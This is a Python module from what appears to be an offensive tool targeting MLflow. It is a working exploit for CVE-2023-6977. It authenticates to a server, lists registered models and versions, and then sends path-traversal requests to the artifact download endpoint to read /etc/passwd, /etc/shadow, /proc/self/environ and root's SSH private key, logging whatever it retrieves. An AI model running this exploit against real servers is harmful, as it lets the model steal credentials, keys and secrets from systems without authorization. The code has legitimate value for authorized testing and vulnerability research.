from typing import ClassVar

from requests import get

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient


class Auxiliary(AuxiliaryBaseClass):
    """
    CVE-2023-6977 — Authenticated path traversal / arbitrary file read via the
    MLflow model registry artifact download endpoint.

    The ``GET /api/2.0/mlflow/model-versions/get-artifact`` endpoint resolves the
    ``path`` query parameter relative to the registered model's artifact root without
    sanitising ``../`` sequences.  An authenticated attacker can escape the model
    artifact directory and read arbitrary files from the server filesystem.

    Affected versions: MLflow < 2.9.2
    Fixed in: 2.9.2
    CVSS: 7.5 (High)
    """

    _client_class = MLflowClient
    _DEFAULT_PATH = "../../../../../../../../etc/passwd"

    # Sensitive targets to iterate when no custom path is given.
    _TARGETS: ClassVar[list[str]] = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../etc/shadow",
        "../../../../../../../../proc/self/environ",
        "../../../../../../../../root/.ssh/id_rsa",
    ]

    def _list_registered_models(
        self,
        base_url: str,
        headers: dict[str, str],
        proxies: dict[str, str] | None = None,
    ) -> list[str]:
        """Return a list of registered model names from the MLflow model registry."""
        endpoint = "/api/2.0/mlflow/registered-models/search"

        try:
            resp = get(
                base_url + endpoint,
                headers=headers,
                params={"max_results": 5},
                timeout=self.TIMEOUT,
                proxies=proxies,
            )
            resp_json = resp.json()
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Could not list registered models: {e!s}")
            return []

        if resp.status_code != 200:
            self.logger.warning(
                f"Registered models listing returned HTTP {resp.status_code}."
            )
            return []

        return [
            m["name"] for m in resp_json.get("registered_models", []) if m.get("name")
        ]

    def _list_model_versions(
        self,
        base_url: str,
        headers: dict[str, str],
        model_name: str,
        proxies: dict[str, str] | None = None,
    ) -> list[str]:
        """Return version numbers for a given registered model."""
        endpoint = "/api/2.0/mlflow/model-versions/search"

        try:
            resp = get(
                base_url + endpoint,
                headers=headers,
                params={"filter": f"name='{model_name}'", "max_results": 5},
                timeout=self.TIMEOUT,
                proxies=proxies,
            )
            resp_json = resp.json()
        except Exception as e:  # noqa: BLE001
            self.logger.warning(
                f"Could not list model versions for {model_name!r}: {e!s}"
            )
            return []

        if resp.status_code != 200:
            return []

        return [
            mv["version"]
            for mv in resp_json.get("model_versions", [])
            if mv.get("version")
        ]

    def trigger_vuln(
        self,
        base_url: str,
        headers: dict[str, str],
        model_name: str,
        version: str,
        path: str,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """
        Attempt path traversal via the model-versions artifact download endpoint.

        Returns (status_code, body) or None on network error.
        """
        endpoint = "/api/2.0/mlflow/model-versions/get-artifact"
        params = {"name": model_name, "version": version, "path": path}

        try:
            resp = get(
                base_url + endpoint,
                headers=headers,
                params=params,
                timeout=self.TIMEOUT,
                proxies=proxies,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error during traversal attempt: {e!s}")
            return None

        return resp.status_code, resp.text

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        self.logger.info(
            f"Authenticating as {username!r} for CVE-2023-6977 (authenticated path traversal)..."
        )
        headers = self.handle_authentication(
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
        )

        if headers is None:
            return False

        self.logger.info("Enumerating registered models...")
        model_names = self._list_registered_models(
            base_url=base_url, headers=headers, proxies=proxies
        )

        if not model_names:
            self.logger.warning(
                "No registered models found — cannot exercise the traversal endpoint."
            )
            return False

        targets = [f_path] if f_path else self._TARGETS

        for model_name in model_names:
            versions = self._list_model_versions(
                base_url=base_url,
                headers=headers,
                model_name=model_name,
                proxies=proxies,
            )

            if not versions:
                self.logger.warning(
                    f"No versions found for model {model_name!r}, skipping."
                )
                continue

            version = versions[0]
            self.logger.info(f"Probing model {model_name!r} version {version!r}...")

            for target in targets:
                self.logger.info(f"Attempting traversal: {target!r}")
                result = self.trigger_vuln(
                    base_url=base_url,
                    headers=headers,
                    model_name=model_name,
                    version=version,
                    path=target,
                    proxies=proxies,
                )

                if result is None:
                    continue

                status, body = result
                if status == 200 and body:
                    self.logger.info(
                        f"Attack successful! Retrieved {len(body)} bytes via path traversal."
                    )
                    self.logger.info(f"Results:\n{body[:2048]}")
                    return True

        self.logger.warning(
            "CVE-2023-6977: all traversal attempts failed — target may be patched."
        )
        return False
